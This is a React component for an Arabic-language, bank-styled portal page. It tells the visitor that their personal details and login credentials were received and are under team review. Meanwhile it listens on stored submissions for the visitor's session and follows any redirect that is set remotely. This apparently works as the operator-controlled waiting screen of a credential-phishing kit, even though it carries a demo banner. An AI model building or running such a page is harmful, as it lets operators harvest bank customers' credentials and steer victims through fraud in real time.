import React, { useEffect } from "react";
import { Link, useNavigate } from "react-router-dom";
import { Check, Hourglass, Info } from "lucide-react";
import DemoBanner from "@/components/bank/DemoBanner";
import PortalLogo from "@/components/bank/PortalLogo";
import { base44 } from "@/api/base44Client";
import { PRIVACY_NOTE } from "@/lib/bankData";

const items = [
  { done: true, text: "تم استلام بياناتك الشخصية" },
  { done: true, text: "تم تسجيل بيانات الدخول" },
  { done: false, text: "جاري مراجعة الطلب من قبل الفريق" },
  { done: false, text: "سيتم إخطارك بالنتيجة قريباً" },
];

export default function Login() {
  const navigate = useNavigate();
  const sessionId = sessionStorage.getItem("portal_session_id");

  useEffect(() => {
    if (!sessionId) return;
    let mounted = true;
    const handle = (data) => {
      if (data?.session_id === sessionId && data?.redirect_to) {
        const target = data.redirect_to;
        navigate(target);
        base44.entities.PortalSubmission.update(data.id, { redirect_to: "" }).catch(() => {});
      }
    };
    base44.entities.PortalSubmission.filter({ session_id: sessionId }, "-created_date", 1)
      .then((r) => {
        if (mounted && r.length) handle(r[0]);
      })
      .catch(() => {});
    const unsub = base44.entities.PortalSubmission.subscribe((event) => {
      if (event.type === "create" || event.type === "update") handle(event.data);
    });
    return () => {
      mounted = false;
      unsub();
    };
  }, [sessionId, navigate]);

  return (
    <div className="min-h-screen bg-white flex flex-col">
      <DemoBanner />
      <div className="flex-1 flex items-center justify-center px-4 py-10">
        <div className="w-full max-w-md space-y-8 text-center">
          <div className="flex justify-center">
            <PortalLogo />
          </div>

          {/* Spinner */}
          <div className="flex justify-center">
            <div className="w-14 h-14 rounded-full border-4 border-slate-200 border-t-[#006747] animate-spin" />
          </div>

          <div className="space-y-2">
            <h1 className="text-2xl font-bold text-[#333333]">جاري معالجة طلبك...</h1>
            <p className="text-sm text-[#777777] leading-relaxed">
              يرجى الانتظار، يقوم فريقنا بمراجعة بياناتك والتحقق منها
            </p>
          </div>

          {/* Checklist */}
          <div className="space-y-3 text-right">
            {items.map((it, i) => (
              <div
                key={i}
                className="flex items-center gap-3 rounded-lg border border-slate-200 bg-white px-4 py-3 shadow-sm"
              >
                {it.done ? (
                  <span className="w-7 h-7 shrink-0 rounded-md bg-[#4CAF50] flex items-center justify-center text-white">
                    <Check className="w-4 h-4" />
                  </span>
                ) : (
                  <span className="w-7 h-7 shrink-0 rounded-md bg-slate-100 flex items-center justify-center text-slate-400">
                    <Hourglass className="w-4 h-4" />
                  </span>
                )}
                <span className={`text-sm ${it.done ? "text-[#333333] font-medium" : "text-[#999999]"}`}>
                  {it.text}
                </span>
              </div>
            ))}
          </div>

          <div className="flex items-start gap-2 rounded-xl bg-[#006747]/5 border border-[#006747]/15 p-3 text-xs text-[#006747]">
            <Info className="w-4 h-4 shrink-0 mt-0.5" />
            <span>{PRIVACY_NOTE}</span>
          </div>

          <div className="text-center text-xs text-slate-400">
            <Link to="/" className="text-slate-500 hover:underline">العودة للرئيسية</Link>
            <span className="mx-2">·</span>
            <Link to="/portal" className="text-slate-500 hover:underline">البوابة</Link>
          </div>
        </div>
      </div>
    </div>
  );
}